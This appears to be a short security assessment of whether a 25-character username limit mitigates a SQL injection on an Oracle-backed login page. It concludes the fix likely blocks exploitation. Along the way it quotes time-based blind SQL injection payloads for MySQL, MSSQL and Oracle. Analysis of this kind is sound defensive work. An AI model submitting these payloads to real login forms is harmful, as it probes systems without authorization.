In addition to limiting the username length, it appears they have either sanitized the control characters \" '; -- \" or they have suppressed the error messages from being echo'd on the login page. If we assume they only have suppressed the error messages, it turns it into a Blind SQL injection. In order for an attacker to find it, they would need to discover a blind sql injection payload (time-based likely) that could fit into 25 characters. The blind injection payload would give the attacker a visual indication their sql injection is succeeding, like making the page pause for a few seconds before it loads. To find a payload that is 25 characters to do this isn't too hard if the back-end was a mysql or microsoft sql (i.e.mysql:-SLEEP(15) mssql:' waitfor delay '0:0:9' --). Fortunately the back-end is oracle and blind sql injection payloads are a little more complicated. An example payload would be: BEGIN DBMS_LOCK.SLEEP(15); END;. This payload is over 25 characters. So even if an attacker found one to fit, the length limitation would make data exfiltration nearly impossible. They would need more space to ask true or false questions and get their answer based on if the page pause for a few seconds. In my opinion, assuming they didn't parameterize the SQL statement, their fix should mitigate any exploitation attempts of the vulnerability.
